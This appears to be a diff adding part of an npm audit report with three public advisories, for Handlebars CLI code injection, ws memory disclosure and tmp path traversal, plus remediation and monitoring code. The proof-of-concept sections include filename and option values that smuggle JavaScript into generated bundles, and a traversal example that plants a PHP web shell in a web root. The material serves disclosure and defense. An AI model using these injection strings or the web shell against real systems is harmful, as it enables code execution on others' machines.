+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33941\n- https://github.com/advisories/GHSA-xjpj-3mr7-gcpf",
+      "created": "2026-03-27T18:22:10.000Z",
+      "id": 1117465,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` / `--commonjs`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` / `--handlebarPath`)\n\n```javascript\n// Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); //.handlebars\"\n\nnode bin/handlebars templates -o out.js\nnode -e 'require(\"./out.js\")'  # Executes injected code, creates ./pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); //\"\nnode -e 'require(\"./out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); //'\nnode -e 'require(\"./out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin/handlebars templates -o out.js -a \\\n  -h \"'); require('fs').writeFileSync('pwned4','1'); // \"\nnode -e 'require(\"./out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33941"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xjpj-3mr7-gcpf",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:53.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-94",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-xjpj-3mr7-gcpf"
+    },
+    "1119108": {
+      "findings": [
+        {
+          "version": "8.18.3",
+          "paths": [
+            ".>viem>ws"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-45736\n- https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086\n- https://github.com/advisories/GHSA-58qx-3vcg-4xpx",
+      "created": "2026-05-18T19:02:40.000Z",
+      "id": 1119108,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `websocket.close()` implementation is vulnerable to uninitialized memory disclosure when a `TypedArray` is passed as the reason argument.\n\n### Proof of concept\n\n```js\nimport { deepStrictEqual } from 'node:assert';\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer(\n  { port: 0, skipUTF8Validation: true },\n  function () {\n    const { port } = wss.address();\n    const ws = new WebSocket(`ws://localhost:${port}`, {\n      skipUTF8Validation: true\n    });\n\n    ws.on('close', function (code, reason) {\n      deepStrictEqual(reason, Buffer.alloc(80));\n    });\n  }\n);\n\nwss.on('connection', function (ws) {\n  ws.close(1000, new Float32Array(20));\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.20.1 (https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086).\n\n### Credits\n\nCredit for the private and responsible disclosure of this issue goes to [Nikita Skovoroda](https://github.com/ChALkeR).\n\n### Remarks\n\nAlthough the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.\n\n### Resources\n\n- https://github.com/advisories/GHSA-58qx-3vcg-4xpx\n- https://www.cve.org/CVERecord?id=CVE-2026-45736",
+      "reported_by": null,
+      "title": "ws: Uninitialized memory disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45736"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ws",
+      "vulnerable_versions": ">=8.0.0 <8.20.1",
+      "github_advisory_id": "GHSA-58qx-3vcg-4xpx",
+      "recommendation": "Upgrade to version 8.20.1 or later",
+      "patched_versions": ">=8.20.1",
+      "updated": "2026-05-18T19:02:42.000Z",
+      "cvss": {
+        "score": 4.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-908"
+      ],
+      "url": "https://github.com/advisories/GHSA-58qx-3vcg-4xpx"
+    },
+    "1119610": {
+      "findings": [
+        {
+          "version": "0.2.5",
+          "paths": [
+            ".>ioredis-mock>fengari>tmp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65\n- https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429\n- https://github.com/advisories/GHSA-ph9p-34f9-6g65",
+      "created": "2026-05-27T00:34:06.000Z",
+      "id": 1119610,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-<pid>-<random>\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) => {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '<?php system($_GET[\"cmd\"]); ?>');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) => {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) => {\n    if (!err && options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix && options.prefix.includes('..'),\n      options.postfix && options.postfix.includes('..'),  \n      options.dir && path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* && \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+      "reported_by": null,
+      "title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44705"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tmp",
+      "vulnerable_versions": "<0.2.6",
+      "github_advisory_id": "GHSA-ph9p-34f9-6g65",
+      "recommendation": "Upgrade to version 0.2.6 or later",
+      "patched_versions": ">=0.2.6",
+      "updated": "2026-05-27T00:34:10.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-ph9p-34f9-6g65"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 2,
+      "moderate": 5,
+      "high": 9,
+      "critical": 1
+    },
+    "dependencies": 369,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 369
+  }
+}
